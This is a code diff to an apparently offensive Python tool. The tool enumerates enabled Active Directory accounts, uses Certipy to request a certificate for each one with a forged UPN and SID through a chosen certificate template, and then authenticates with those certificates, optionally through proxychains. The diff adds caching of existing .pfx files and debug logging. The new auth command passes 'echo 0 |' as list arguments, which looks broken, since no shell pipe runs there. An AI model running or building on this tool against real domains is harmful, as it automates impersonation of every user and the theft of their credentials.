@@ -107,6 +107,10 @@ def extract_accounts(data):
     logger.success(f"✅ Found {len(accounts.accounts)} enabled accounts.")
     return accounts
 
+def get_dc_netbios_from_fqdn(dc_fqdn: str) -> str:
+    dc_netbios_domain = dc_fqdn.split('.')[0].lower()
+    return dc_netbios_domain
+
 def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, debug):
     """Retrieve certificates using Certipy."""
     logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")
@@ -114,6 +118,19 @@ def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, tar
     def fetch_cert(account):
         upn = f"'{account.spn}'"
         sid = f"'{account.sid}'"
+        dc_netbios_domain = get_dc_netbios_from_fqdn(dc_fqdn)
+        pfx_file = f"{account.usernameLower}_{dc_netbios_domain}.pfx"
+        pfx_filepath = os.path.join(certificates_folder, pfx_file)
+        if os.path.exists(pfx_file):
+            if debug:
+                logger.debug(f"skipping {upn}, pfx file already exists")
+            account.pfx_filepath = pfx_file
+            return account, None, None
+        if os.path.exists(pfx_filepath):
+            if debug:
+                logger.debug(f"skipping {upn}, pfx file already exists")
+            account.pfx_filepath = pfx_filepath
+            return account, None, None
         if proxychains:
             command = [
                 'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
@@ -125,6 +142,9 @@ def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, tar
                   '-template', template, '-upn', upn, '-sid', sid
             ]
         process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        # if debug:
+        #     logger.debug(process.stdout)
+        #     logger.debug(process.stderr)
         if "Failed to connect" in process.stdout:
             logger.error(f"⏳ Connection failed for account: {account.usernameLower}")
             return None
@@ -134,6 +154,8 @@ def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, tar
             if filename.endswith('.pfx') and filename.startswith(account.usernameLower):
                 destination = os.path.join(certificates_folder, filename)
                 account.pfx_filepath = destination
+                if debug:
+                    logger.debug(f"moving {destination} to {certificates_folder}!")
                 shutil.move(filename, destination)
 
         return account, process.stdout, process.stderr
@@ -145,7 +167,7 @@ def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, tar
             if result:
                 account, stdout, stderr = result
                 if debug:
-                    logging.debug(f"[Cert Fetch] {account.username} | {stdout.strip()} | {stderr.strip()}")
+                    logger.debug(f"[Cert Fetch] {account.username} | {stdout.strip()} | {stderr.strip()}")
 
 def authenticate_accounts(accounts, dc_ip, proxychains, output_file):
     """Authenticate using retrieved certificates."""
@@ -154,9 +176,9 @@ def authenticate_accounts(accounts, dc_ip, proxychains, output_file):
         if not account.pfx_filepath.endswith('.pfx'):
             return None
         if proxychains:
-            command = ['proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
+            command = ['echo', '0', '|', 'proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-domain', account.domain, '-dc-ip', dc_ip]
         else:
-            command = [certipy_client, 'auth', '-pfx', account.pfx_filepath,  '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
+            command = ['echo', '0', '|', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-domain', account.domain, '-dc-ip', dc_ip]
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = process.communicate()
         return account, stdout.strip()
